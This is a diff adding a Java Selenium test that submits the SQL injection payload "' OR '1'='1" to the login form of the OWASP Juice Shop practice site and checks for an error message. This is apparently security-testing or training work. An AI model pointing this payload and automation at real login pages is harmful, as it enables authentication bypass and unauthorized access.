@@ -1,0 +1,46 @@
+import org.openqa.selenium.By;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.chrome.ChromeDriver;
+
+public class SQLInjectionTest {
+    public static void main(String[] args) {
+        System.setProperty("webdriver.chrome.driver", "path/to/chromedriver");
+
+        WebDriver driver = new ChromeDriver();
+
+        try {
+            driver.get("https://juice-shop.herokuapp.com/#/login");
+
+            // Locate username and password fields
+            WebElement emailField = driver.findElement(By.id("email"));
+            WebElement passwordField = driver.findElement(By.id("password"));
+
+            // Craft malicious username string (SQL injection attempt)
+            String maliciousUsername = "' OR '1'='1";
+            emailField.sendKeys(maliciousUsername);
+
+            // Enter a valid password
+            String validPassword = "password";
+            passwordField.sendKeys(validPassword);
+
+            // Submit the login form
+            WebElement loginButton = driver.findElement(By.id("loginButton"));
+            loginButton.click();
+
+            // Analyze the browser response for error messages
+            WebElement errorMessage = driver.findElement(By.cssSelector(".error"));
+            if (errorMessage != null) {
+                System.out.println("SQL injection attempt failed, received error message: " + errorMessage.getText());
+            } else {
+                System.out.println("No error message detected.");
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            // Close the browser
+            driver.quit();
+        }
+    }
+}
